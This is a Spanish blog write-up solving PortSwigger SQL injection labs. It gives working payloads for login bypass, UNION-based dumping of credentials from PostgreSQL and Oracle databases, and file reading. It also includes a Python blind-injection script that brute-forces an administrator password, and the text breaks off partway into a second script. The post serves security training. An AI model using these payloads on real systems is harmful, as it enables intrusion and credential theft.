<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>SQL Injection - Portswigger | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="SQL Injection - Portswigger" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hacking-web/portswigger/2024/03/18/sqli-portswigger.html" />
<meta property="og:url" content="http://localhost:4000/hacking-web/portswigger/2024/03/18/sqli-portswigger.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-03-18T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="SQL Injection - Portswigger" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-18T00:00:00-06:00","datePublished":"2024-03-18T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"SQL Injection - Portswigger","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hacking-web/portswigger/2024/03/18/sqli-portswigger.html"},"url":"http://localhost:4000/hacking-web/portswigger/2024/03/18/sqli-portswigger.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">SQL Injection - Portswigger</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-03-18T00:00:00-06:00" itemprop="datePublished">
        Mar 18, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="/assets/portswigger/sqli/logo.png" />
</p>

<p>⮕ SQL Injections Lab (Puedes dar click en cualquier tipo de inyeccion que esta en el contenido para ir directamente a esa)</p>

<blockquote>
  <p>Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.</p>
</blockquote>

<ul>
  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a>.</li>
</ul>

<h2 id="sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>

<ul>
  <li>
    <p>Lo primero que debes de hacer es ir ala pagina web y cuenta puedes hacer esto <a href="https://portswigger.net/">aqui</a> <strong>Es mejor hacerlo desde un navegador google chrome</strong>.</p>
  </li>
  <li>
    <p>Una vez creaste tu cuenta iremos al primer caso <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data">https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data</a> y pues accedes en el lab.</p>
  </li>
  <li>
    <p>Vemos una tienda.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web1.png" alt="" /></p>

<ul>
  <li>En la descripción del laboratorio nos dicen que cuando elegimos una categoría esta es la <code class="language-plaintext highlighter-rouge">query</code> que pasa por detrás <strong>Lo que esta haciendo es mostrarte todo de la categoria que elegiste donde products es la tabla y category es la columna</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT <span class="k">*</span> FROM products WHERE category <span class="o">=</span> <span class="s1">'Gifts'</span> AND released <span class="o">=</span> 1
</code></pre></div></div>

<ul>
  <li>
    <p>Lo que nos están pidiendo es que realicemos una inyección <strong>SQLI</strong> que lo haga es mostrar mas detalles de los productos publicas y no publicados en cualquier categoría.</p>
  </li>
  <li>
    <p>Si seleccionamos <code class="language-plaintext highlighter-rouge">Pets</code> la <code class="language-plaintext highlighter-rouge">url</code> queda de esta manera.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web2.png" alt="" /></p>

<ul>
  <li>Si ponemos <code class="language-plaintext highlighter-rouge">' or 1=1-- -</code> lo que va hacer es que con la <code class="language-plaintext highlighter-rouge">'</code> cerramos la categoría y el <code class="language-plaintext highlighter-rouge">or 1=1-- -</code> lo que hace es que como le estas diciendo <code class="language-plaintext highlighter-rouge">1=1</code> lo cual es correcto y es <strong>TRUE</strong> te lo va tomar como valido y el <code class="language-plaintext highlighter-rouge">-- -</code> es para comentar el resto de la <code class="language-plaintext highlighter-rouge">query</code> para que no interpreta lo que esta alado en esta caso lo que no se va a interpretar es <code class="language-plaintext highlighter-rouge">AND released = 1</code> si ponemos esa <code class="language-plaintext highlighter-rouge">query</code> saldrán productos que no estaban y con eso completamos el lab.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web3.png" alt="" /></p>

<h2 id="sql-injection-vulnerability-allowing-login-bypass">SQL injection vulnerability allowing login bypass</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">https://portswigger.net/web-security/sql-injection/lab-login-bypass</a>.</p>
  </li>
  <li>
    <p>Ahora en este laboratorio nos piden hacer una <code class="language-plaintext highlighter-rouge">SQLI</code> a un panel de login donde nos conectemos como el usuario <strong>administrador</strong> sin proporcionar contraseña.</p>
  </li>
  <li>
    <p>Este es el panel de login.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web4.png" alt="" /></p>

<ul>
  <li>Si analizamos lo que nos piden por detrás lo mas seguro es que se esta aplicando una <code class="language-plaintext highlighter-rouge">query</code> como esta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select </span>name,lastname from <span class="nb">users </span>where username <span class="o">=</span> <span class="s1">'administrator'</span> and password <span class="o">=</span> <span class="s1">'password'</span>
</code></pre></div></div>

<ul>
  <li>El campo <code class="language-plaintext highlighter-rouge">Username</code> pues es el usuario y el campo <code class="language-plaintext highlighter-rouge">Password</code> pues va la contraseña en los 2 campos podemos escribir pero bueno nos piden conectarnos como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> pero no sabemos su contraseña así que lo que podemos hacer es que el <strong>input</strong> del <strong>Username</strong> poner <code class="language-plaintext highlighter-rouge">Administrator'-- -</code> lo que estaremos haciendo es que no aplica la comparativa que esta haciendo para la contraseña estamos comentando esa parte en la contraseña puedes poner cualquier cosa pero no la va a tomar en cuenta por que estas comentando el resto de la query.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web5.png" alt="" /></p>

<ul>
  <li>Si le damos en <code class="language-plaintext highlighter-rouge">Log in</code> funciona y terminamos el lab.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web6.png" alt="" /></p>

<h2 id="sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">SQL injection UNION attack, determining the number of columns returned by the query</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns</a>.</p>
  </li>
  <li>
    <p>Ahora lo que nos piden es determinar el numero de columnas que existen en las inyecciones pues tenemos: <strong>bases de datos, tablas, columnas y datos</strong> al igual nos dicen que la parte de la categoría es donde se acontece la vulnerabilidad.</p>
  </li>
  <li>
    <p>Esta es la web.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web7.png" alt="" /></p>

<ul>
  <li>Vamos a filtrar por alguna categoría y ya vemos que nos esta mostrando cosas relacionas a eso.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web8.png" alt="" /></p>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">'order by 100-- -</code> que bueno esto es para aplicar un ordenamiento basándonos en la 100 columna que pues obviamente nos existe y nos da un error.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Gifts' order by 100-- -</code></p>

<p><img src="/assets/portswigger/sqli/web9.png" alt="" /></p>

<ul>
  <li>Lo que podemos hacer es que cuando no nos ponga error pues seria correcta si rebajos a 3 ya no nos da error <code class="language-plaintext highlighter-rouge">' order by 3-- -</code> por que es correcto.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web10.png" alt="" /></p>

<ul>
  <li>
    <p>Ahora sabiendo el numero total de columnas podemos usar un <code class="language-plaintext highlighter-rouge">Union select</code> para combinar datos.</p>
  </li>
  <li>
    <p>Seria algo así la query <code class="language-plaintext highlighter-rouge">' union select NULL,NULL,NULL-- -</code> en este caso tenemos que poner <code class="language-plaintext highlighter-rouge">NULL</code> por que en la web no admite numeros pero lo que casi siempre se pone es por ejemplo si son 3 pues <code class="language-plaintext highlighter-rouge">'union select 1,2,3-- -</code> casi siempre el atacante se aprovecha de esto para por ejemplo en el 1 que mejor nos diga cual es la base de datos actualmente en uso haciendo esto <code class="language-plaintext highlighter-rouge">'union select database(),2,3-- -</code> , ademas tambien puedes saber quien esta corriendo la base de datos, cargar archivos de la maquina con     <code class="language-plaintext highlighter-rouge">'union select load_file("/etc/hosts"),2,3-- -</code> esto depende si tienes capacidad de lectura si no pues no podrás cargar el archivo y muchas mas vamos a resolver el lab con este que ahora ya sabemos.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web11.png" alt="" /></p>

<ul>
  <li>Y funciona.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web12.png" alt="" /></p>

<h2 id="sql-injection-union-attack-finding-a-column-containing-text">SQL injection UNION attack, finding a column containing text</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text</a>.</p>
  </li>
  <li>
    <p>Ahora lo que nos piden es que atraves de nuestra <strong>query</strong> la base de datos nos devuelva la cadena que nos dan (la tuya pueda ser diferente).</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web13.png" alt="" /></p>

<ul>
  <li>Vamos irnos a una categoría para seleccionarla ademas sabemos que hay 3 columnas asi que es igual <code class="language-plaintext highlighter-rouge">' union select NULL,NULL,NULL-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web14.png" alt="" /></p>

<ul>
  <li>Bueno de primeras no sabemos cual campo es inyectable si el 1,2 o 3 así que lo que tenemos que hacer es ir probando para ver en cual si nos interpreta la cadena vamos a probar el primer campo y no <code class="language-plaintext highlighter-rouge">' union select 'v3jsC6',NULL,NULL-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web15.png" alt="" /></p>

<p><img src="/assets/portswigger/sqli/web16.png" alt="" /></p>

<ul>
  <li>Si lo probamos en la segunda si funciona y con esto ya terminamos el laboratorio <code class="language-plaintext highlighter-rouge">' union select NULL,'v3jsC6',NULL-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web17.png" alt="" /></p>

<h2 id="sql-injection-union-attack-retrieving-data-from-other-tables">SQL injection UNION attack, retrieving data from other tables</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables</a>.</p>
  </li>
  <li>
    <p>Ahora nos piden primero es que nos conectemos como el usuario <strong>Administrador</strong> pero antes tenemos que averiguar cual es la contraseña del usuario <strong>administrador</strong> aplicando un inyección <strong>sql</strong>.</p>
  </li>
  <li>
    <p>Vamos a seleccionar otra vez otra categoría.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web18.png" alt="" /></p>

<ul>
  <li>Ahora primeramente necesitamos saber cuantas columnas hay ya les adelanto que hay 2 por que si analizas la web abajo te esta mostrando un titulo y una descripción.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web19.png" alt="" /></p>

<ul>
  <li>Ya vemos que funciona ahora siguiente el concepto necesitamos saber cual es el campo inyectable.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web20.png" alt="" /></p>

<ul>
  <li>Si probamos con el primer campo inyectando una string vemos que si funciona <code class="language-plaintext highlighter-rouge">'union select 'xd',NULL-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web21.png" alt="" /></p>

<ul>
  <li>Ahora vamos a inyectar una query para saber las bases de datos que existen <code class="language-plaintext highlighter-rouge">' union select schema_name,NULL from information_schema.schemata-- -</code> y nos esta mostrando Bases de datos.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web22.png" alt="" /></p>

<ul>
  <li>Ya conocemos las bases de datos ahora tenemos que enumerar las tablas si haces esto <code class="language-plaintext highlighter-rouge">' union select table_name,NULL from information_schema.tables-- -</code> si haces esto te va a mostrar todas las tablas de todas las bases de datos tal vez suena interesante pero no es la idea por que solo queremos saber la contraseña del usuario <strong>administrator</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web23.png" alt="" /></p>

<ul>
  <li>Podemos indicarle de cual base de datos queremos saber las tablas de la base de datos <code class="language-plaintext highlighter-rouge">public</code> con la siguiente <strong>query</strong> <code class="language-plaintext highlighter-rouge">' union select NULL,table_name from information_schema.tables where table_schema='public'-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web24.png" alt="" /></p>

<ul>
  <li>
    <p>La tabla <strong>users</strong> esta interesante lo mas probable es que hay estén las columnas usernames y password.</p>
  </li>
  <li>
    <p>Ahora vamos a dumpear las columnas para la tabla <strong>users</strong> y para la base de datos <strong>public</strong> esta seria la query <code class="language-plaintext highlighter-rouge">' union select column_name,NULL from information_schema.columns where table_schema ='public' and table_name='users'-- - </code>.</p>
  </li>
  <li>
    <p>Si aplicamos la <code class="language-plaintext highlighter-rouge">query</code> vemos las columnas existentes.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web25.png" alt="" /></p>

<ul>
  <li>Después de probar varias querys esta fue la única que me funciono <code class="language-plaintext highlighter-rouge">' union select NULL,username||':'||password from users-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web26.png" alt="" /></p>

<ul>
  <li>Ahora si nos a la sección de <strong>My account</strong> vemos que las credenciales son correctas y podemos conectarnos.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web27.png" alt="" /></p>

<h2 id="sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">SQL injection UNION attack, retrieving multiple values in a single column</h2>

<ul>
  <li>Ahora nos piden representar múltiples campos en una sola columna lo mismo de antes para conectarnos como el administrador.</li>
</ul>

<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column</a></p>

<ul>
  <li>Ahora lo que vamos a hacer es seleccionar otra categoría y ya podemos ver que van a ser solo 2 columnas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web28.png" alt="" /></p>

<ul>
  <li>Vamos a hacer lo mismo para saber cuales son las bases de datos.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web29.png" alt="" /></p>

<ul>
  <li>Ahora vamos a enumerar las tablas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web30.png" alt="" /></p>

<ul>
  <li>Ahora vamos a enumerar las columnas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web31.png" alt="" /></p>

<ul>
  <li>Vamos aplicar un <strong>concat</strong> para ver la data.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web32.png" alt="" /></p>

<ul>
  <li>Ahora nos vamos a conectar y las credenciales son validas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web33.png" alt="" /></p>

<h2 id="sql-injection-attack-querying-the-database-type-and-version-on-oracle">SQL injection attack, querying the database type and version on Oracle</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle</a>.</p>
  </li>
  <li>
    <p>Ahora la cosa cambia por que la base de datos es de <code class="language-plaintext highlighter-rouge">Oracle</code> y nos piden averiguar la versión y el tipo de base de datos que esta empleando.</p>
  </li>
  <li>
    <p>Si nos abrimos el laboratorio vemos que nos dice que hagamos que nos devuelva toda esa string.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web34.png" alt="" /></p>

<ul>
  <li>Vamos a seleccionar una categoría y como es lo mismo que en las anteriores pues son 2 columnas pero me da error aunque haga <code class="language-plaintext highlighter-rouge">' union select NULL,NULL-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web35.png" alt="" /></p>

<ul>
  <li>Pero bueno nos da el error por que se esta empleando <strong>Oracle</strong> y en <strong>Oracle</strong> tenemos que siempre indicar una tabla bueno esta es la tabla que es mejor.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web36.png" alt="" /></p>

<ul>
  <li>Si ahora le indicamos al tabla <code class="language-plaintext highlighter-rouge">dual</code> ya nos va a dar error <code class="language-plaintext highlighter-rouge">' union select NULL,NULL from dual-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web37.png" alt="" /></p>

<ul>
  <li>Si nos vamos al <strong>cheet sheet</strong> que puse al principio nos dan información de como hacerlo para <strong>Oracle</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web38.png" alt="" /></p>

<ul>
  <li>Vamos a emplear la siguiente <strong>query</strong> por que ya sabemos como hacerlo <code class="language-plaintext highlighter-rouge">' union select NULL,banner from v$version-- -</code> y funciona.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web39.png" alt="" /></p>

<h2 id="sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft</a>.</p>
  </li>
  <li>
    <p>Ahora nos piden lo mismo pero para <strong>Microsoft</strong>.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web40.png" alt="" /></p>

<ul>
  <li>Basándonos en el <strong>cheet sheet</strong> pues rápido podemos ver la versión con la siguiente <strong>query</strong> <code class="language-plaintext highlighter-rouge">' union select NULL,@@version-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web41.png" alt="" /></p>

<h2 id="sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">SQL injection attack, listing the database contents on non-Oracle databases</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle</a>.</p>
  </li>
  <li>
    <p>Ahora nos piden obtener la contraseña del usuario <strong>administrator</strong>.</p>
  </li>
  <li>
    <p>Vamos a elegir una categoría y como sabemos que son 2 columnas <strong>NULL,NULL</strong> pues vamos a enumerar las bases de datos directamente.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web42.png" alt="" /></p>

<ul>
  <li>Vamos a enumerar las tablas para la base de datos <strong>public</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web43.png" alt="" /></p>

<ul>
  <li>Ahora las columnas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web44.png" alt="" /></p>

<ul>
  <li>Y con esto tenemos las contraseñas.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web45.png" alt="" /></p>

<ul>
  <li>Vamos validar que son correctas y terminamos el laboratorio.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web46.png" alt="" /></p>

<h2 id="sql-injection-attack-listing-the-database-contents-on-oracle">SQL injection attack, listing the database contents on Oracle</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle</a>.</p>
  </li>
  <li>
    <p>Ahora tenemos que hacer lo mismo pero para <strong>Oracle</strong>.</p>
  </li>
  <li>
    <p>Vamos a seleccionar una categoría y bueno ya sabemos que hay 2 columnas pero tenemos que usar <strong>dual</strong> por que se esta empleando <strong>Oracle</strong>.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web47.png" alt="" /></p>

<ul>
  <li>
    <p>Ahora vamos seguir dumpeando pero hay que recordar que se esta usando <strong>Oracle</strong>.</p>
  </li>
  <li>
    <p>Bueno en <strong>Oracle</strong> podemos ver propietarios de las bases de datos <code class="language-plaintext highlighter-rouge">' union select NULL,owner from all_tables-- -</code>.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web48.png" alt="" /></p>

<ul>
  <li>
    <p>Podemos ver las tablas donde el propietario sea <strong>PETER</strong>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">' union select NULL,table_name from all_tables where owner = 'PETER'-- -</code>.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web49.png" alt="" /></p>

<ul>
  <li>Ahora vamos a dumpear las columnas <code class="language-plaintext highlighter-rouge">' union select NULL,column_name from all_tab_columns where table_name = 'USERS_YUXJGI'-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web50.png" alt="" /></p>

<ul>
  <li>Con la siguiente query vamos ver las credenciales <code class="language-plaintext highlighter-rouge">' union select NULL,USERNAME_YRXBVR||':'||PASSWORD_QLAFCK from USERS_YUXJGI-- -</code>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web51.png" alt="" /></p>

<ul>
  <li>Ahora si nos conectamos pues terminas el laboratorio y bueno a por el siguiente.</li>
</ul>

<h2 id="blind-sql-injection-with-conditional-responses">Blind SQL injection with conditional responses</h2>

<ul>
  <li>
    <p>Esta inyección es basada en la respuesta y bueno tenemos la misma web así que vamos a volver a elegir una categoría.</p>
  </li>
  <li>
    <p>Si ponemos una <strong>‘</strong> vemos que desaparecen las cosas.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web52.png" alt="" /></p>

<ul>
  <li>Si ponemos varias querys pues no va a pasar nada pero si leemos bien lo que tenemos que hacer nos dice que que el campo inyectable no es el de la categoría es en la <code class="language-plaintext highlighter-rouge">cookie</code> es por eso que si pruebas cosas no te va a mostrar nada <strong>vamos a usar Burpsuite</strong> para capturar la petición simplemente recarga y listo.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web56.png" alt="" /></p>

<ul>
  <li>
    <p>Bueno si leemos nos dicen que el <strong>Welcome Back</strong> el mensaje que nos aparecía para ciertas peticiones puede desaparecer así que eso ya lo podemos poner como pista.</p>
  </li>
  <li>
    <p>Si ponemos una <strong>‘</strong> en la parte inyectable desaparece el mensaje.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web57.png" alt="" /></p>

<ul>
  <li>Si comentas el resto de la query nos pone el mensaje.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web58.png" alt="" /></p>

<ul>
  <li>Lo que vamos a hacer es aprovecharnos del mensaje si probamos con un 2=1– - que es falso nos quita el mensaje.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web59.png" alt="" /></p>

<ul>
  <li>Bueno lo que podemos hacer es meter una nueva <strong>query</strong> sabemos que la tabla <strong>users</strong> existe entonces podemos jugar con <strong>substring</strong> aprovechándonos de la tabla <strong>users</strong> del usuario <strong>administrator</strong>.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web60.png" alt="" /></p>

<ul>
  <li>Bueno como es un <strong>conditional error</strong> si por ejemplo ponemos la letra <strong>b</strong> a no igual a <strong>b</strong> entonces no nos muestra el mensaje podemos basarnos en eso para saber cuando el carácter es valido o no.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web61.png" alt="" /></p>

<ul>
  <li>Si por ejemplo seleccionamos el segundo caracter <strong>username,2,1</strong> la palabra <strong>admnistrator</strong> su segunda letra es la <strong>d</strong> así que ya es correcto y nos aparece en el mensaje para basarnos en eso.</li>
</ul>

<p><img src="/assets/portswigger/sqli/web62.png" alt="" /></p>

<ul>
  <li>Igual que el campo <strong>Username</strong> podemos hacerlo para <strong>password</strong> pero vamos a usar <strong>Python3</strong> para que sea mucho mas rápido y poder fuzzear las posiciones y nos basamos en la respuesta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>

from pwn import <span class="k">*</span>
import requests, <span class="nb">time</span>, signal, sys, string

def def_handler<span class="o">(</span>sig, frame<span class="o">)</span>:
    print<span class="o">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo...</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
    sys.exit<span class="o">(</span>1<span class="o">)</span>

<span class="c"># Ctrl+c </span>
signal.signal<span class="o">(</span>signal.SIGINT, def_handler<span class="o">)</span>

main_url <span class="o">=</span> <span class="s2">"https://0aa6009704c7d45a88ea00aa00d1002d.web-security-academy.net/"</span>
characters <span class="o">=</span> string.ascii_lowercase + string.digits

def makeRequest<span class="o">()</span>:
    
    password <span class="o">=</span> <span class="s2">""</span>

    p1 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Fuerza Bruta"</span><span class="o">)</span>
    p1.status<span class="o">(</span><span class="s2">"Iniciando Fuerza Bruta"</span><span class="o">)</span>

    time.sleep<span class="o">(</span>2<span class="o">)</span>

    p2 <span class="o">=</span> log.progress<span class="o">(</span><span class="s2">"Password"</span><span class="o">)</span>

    <span class="k">for </span>position <span class="k">in </span>range<span class="o">(</span>1, 21<span class="o">)</span>: <span class="c"># Longitud de la contraseña </span>
        <span class="k">for </span>character <span class="k">in </span>characters:    
            
            cookies <span class="o">=</span> <span class="o">{</span>
                <span class="s1">'TrackingId'</span>: <span class="s2">"h9NyMIr3HYJLUkb8' and (select substring(password,%d,1) from users where username='administrator')='%s"</span> % <span class="o">(</span>position, character<span class="o">)</span>,
                <span class="s1">'session'</span>: <span class="s1">'yTTLOIU9sVTCPIJ9RRzXZF1jIoSmaWuN'</span>
            <span class="o">}</span>

            p1.status<span class="o">(</span>cookies[<span class="s1">'TrackingId'</span><span class="o">])</span>

            r <span class="o">=</span> requests.get<span class="o">(</span>main_url, <span class="nv">cookies</span><span class="o">=</span>cookies<span class="o">)</span>

            <span class="k">if</span> <span class="s2">"Welcome back!"</span> <span class="k">in </span>r.text:
                password +<span class="o">=</span> character
                p2.status<span class="o">(</span>password<span class="o">)</span>
                <span class="nb">break
</span><span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    makeRequest<span class="o">()</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 portswigger_ce.py
<span class="o">[</span>◤] Fuerza Bruta: h9NyMIr3HYJLUkb8<span class="s1">' and (select substring(password,20,1) from users where username='</span>administrator<span class="s1">')='</span>r
<span class="o">[</span>▅] Password: 9ukm2pkd8yzk570rqv2r
</code></pre></div></div>

<p><img src="/assets/portswigger/sqli/web63.png" alt="" /></p>

<h2 id="blind-sql-injection-with-conditional-errors">Blind SQL injection with conditional errors</h2>

<ul>
  <li>
    <p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors</a>.</p>
  </li>
  <li>
    <p>Para esta inyeccion no vas a ver errores en la respuesta si nos vamos a ver códigos de estado y en eso nos vamos a basar y bueno es otro vez atreves de la cookie asi que vamos a seleccionar una categoría y de hay pues vamos a interceptar la petición con <strong>Burpsuite</strong> y bueno ahora no vemos nada del welcome back!.</p>
  </li>
</ul>

<p><img src="/assets/portswigger/sqli/web64.png" alt="" /></p>

<ul>
  <li>Si en el <strong>Tracking Id</strong> podemos una camilla nos sale un error con el código 500 así que pues bueno va a ser lo mismo pero ahora basándonos en el error pero bueno si es que cambian algunas cosas pero en el siguiente script de <strong>Python3</strong> la inyeccion quedaria lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3 </span>

from pwn import <span class="k">*</span>
import requests, <span class="nb">time</span>, signal, sys, string

def def_handler<span class="o">(</span>sig, frame<span class="o">)</span>:
